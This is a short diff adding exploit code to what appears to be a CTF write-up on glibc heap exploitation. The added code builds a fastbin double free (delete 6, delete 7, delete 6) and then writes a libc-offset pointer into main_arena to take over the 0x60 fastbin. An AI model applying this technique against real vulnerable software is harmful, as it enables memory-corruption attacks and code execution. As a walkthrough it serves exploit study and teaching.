@@ -105,6 +105,11 @@ Inspecting the main arena:
 
 We can notice our fake size was put in 0x0007f2ee0db4b88 which normally is the place for the 0x50 fastbin pointer. We'll continue with the next double free to set a pointer in the place for the 0x60 fastbins.
 ```python
+create(b"CREATE luma1234" + b'\x00'*0x48)
+create(b"CREATE Luma1234" + b'\x00'*0x48)
+delete(b"DELETE 6")
+delete(b"DELETE 7")
+delete(b"DELETE 6")
 # Address in main_arena where the pointer for 0x60 fastbins
 # should be - 16 accounting for heap chunk metadata
 create(b"CREATE " + p64(Libc + 3885952) + b'\x00'*0x48)
